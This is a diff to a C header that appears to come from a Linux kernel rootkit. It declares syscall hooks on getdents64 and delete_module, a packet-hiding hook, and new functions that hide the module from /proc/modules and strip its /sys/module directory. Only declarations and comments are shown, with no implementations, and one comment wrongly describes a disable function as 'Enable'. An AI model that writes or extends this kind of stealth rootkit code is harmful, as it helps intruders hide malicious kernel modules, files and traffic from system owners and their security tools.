@@ -14,13 +14,26 @@ HOOK_X64_SYSCALL_EXTERN(hide, getdents64);
 /// @brief Enable/disable hiding of RX packets by configured filters at `netif_receive_skb_list_internal`
 HOOK_EXTERN(hide, netif_receive_skb_list);
 
-/// @brief Enable hiding this module from the module list.
+/// @brief Enable all available methods of hiding this kernel module
 void hide_enable_thismodule(void);
 
-/// @brief Disable hiding this module from the module list.
-/// @attention This is called from within hooks which are used to set the module as
-///     removable, and there is no reason to call this from module_exit.
+/// @brief Enable all available methods of hiding this kernel module
+/// @attention Unlike most hides, there is no reason to call this on module_exit
 void hide_disable_thismodule(void);
+
+/// @brief Enable hiding this module from the module list in /proc/modules
+void hide_enable_proc_module_this(void);
+
+/// @brief Disable hiding this module from the module list in /proc/modules
+void hide_disable_proc_module_this(void);
+
+/// @brief Remove this module's directory from /sys/module
+void hide_enable_sys_module_this(void);
+
+/// @brief Restore this module's /sys/module directory
+/// @attention Not implemented to completely replicate the /sys/module/... directory structure -
+///     only enough so that the module can unload with `delete_module`.
+void hide_disable_sys_module_this(void);
 
 /// @brief Enable/disable hooking the delete_module syscall to allow rmmod'ing this module.
 HOOK_X64_SYSCALL_EXTERN(hide, delete_module);
